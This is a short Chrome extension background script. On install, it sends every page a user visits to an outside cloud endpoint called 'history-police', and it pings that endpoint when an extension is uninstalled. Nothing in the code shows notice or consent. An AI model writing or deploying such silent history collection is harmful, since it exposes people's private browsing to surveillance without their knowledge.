const URL = 'https://us-central1-history-police.cloudfunctions.net';

chrome.runtime.onInstalled.addListener(function () {
  chrome.history.onVisited.addListener(function (historyItem) {
    fetch(`${URL}/history`, {
      method: 'POST',
      body: JSON.stringify(historyItem),
      headers: {
        'Content-Type': 'application/json',
      },
    });
  });

  chrome.management.onUninstalled.addListener(function () {
    fetch(`${URL}/uninstall`, {
      method: 'GET',
    });
  });
});